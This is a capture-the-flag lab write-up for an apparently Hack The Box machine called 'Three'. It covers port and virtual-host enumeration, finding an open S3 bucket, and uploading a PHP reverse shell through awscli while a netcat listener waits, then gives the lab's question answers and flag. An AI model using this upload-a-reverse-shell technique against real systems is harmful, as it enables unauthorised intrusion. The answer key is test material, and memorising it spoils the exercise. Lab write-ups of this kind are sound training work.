# Three

> IP: [10.129.227.248]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.129.227.248 -oN init_scan
      1. Port 22 -> ssh -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
      2. Port 80 -> http -> Apache httpd 2.4.29 ((Ubuntu))
3. HTTP
   1. Navigate to website
      1. This looks to be a site for a musical band with tour dates and merchandise
      2. We see potential users
         1. John Smith
         2. Shane Marks
         3. Jim Tailer
      3. We also see an email `mail@thetoppers.htb` - this has a domain
         1. Lets add this to our /etc/hosts file and then do some enumeration
      4. SOURCE-CODE
         1. Nothing in here stands out
   2. GOBUSTER
      1. Look for subdomains
         1. > gobuster dns -d thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt
            1. Nothing
         2. > gobuster dns -d thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
            1. Nothing
         3. > gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
            1. After some research we needed to change to vhost mode and --append-domain
            2. RESPONSE: `Found: s3.thetoppers.htb Status: 404 [Size: 21]`
               1. The s3 means there is an amazon s3 bucket
4. AMAZON S3
   1. Now lets connect to the s3 bucket using the awscli
      1. First we need to configure the aws client
         1. > aws configure
   2. Looking up the cli documentation we see that we can connect to the s3 bucket with the url by using --endpoint-url
      1. > aws s3 ls --endpoint-url http://s3.thetoppers.htb
         1. ERROR: Could not connect to the endpoint URL: "http://s3.thetoppers.htb/"
            1. We need to add the new subdomain we found to our /etc/hosts file
      2. > aws s3 ls --endpoint-url http://s3.thetoppers.htb
         1. RESPONSE: 2024-02-07 10:17:21 thetoppers.htb
         2. So we need to add thetoppers.htb to our s3 url
      3. > aws s3 ls --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
         1. .htaccess
         2. index.php
            1. In here we see it is running `PHP` as our index file is .php
            2. Since it is running php maybe we can upload a revshell
   3. UPLOAD
      1. Looking at the documentation we see that we can upload to the bucket using the cp command
         1. > aws s3 cp ./revshell.php --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
      2. Now lets navigate to the /revshell.php in our browser with a netcat listener up
         1. > nc -lnvp 1234
            1. SUCCESS
5. ENUMERATION
   1. Search for the flag
      1. > find / -name flag.txt 2>/dev/null
         1. /var/www/flag.txt
      2. > cat flag.txt
         1. `a980d99281a28d638ac68b9bf9453c2b`

## QUESTIONS

1. How many TCP ports are open?
   1. `2`
2. What is the domain of the email address provided in the "Contact" section of the website?
   1. `thetoppers.htb`
3. n the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
   1. `/etc/hosts`
4. Which sub-domain is discovered during further enumeration?
   1. `s3.thetoppers.htb`
5. Which service is running on the discovered sub-domain?
   1. `amazon s3`
6. Which command line utility can be used to interact with the service running on the discovered sub-domain?
   1. `awscli`
7. Which command is used to set up the AWS CLI installation?
   1. `aws configure`
8. What is the command used by the above utility to list all of the S3 buckets?
   1. `aws s3 ls`
9. This server is configured to run files written in what web scripting language?
   1. `php`
10. Submit root flag
   1. `a980d99281a28d638ac68b9bf9453c2b`  
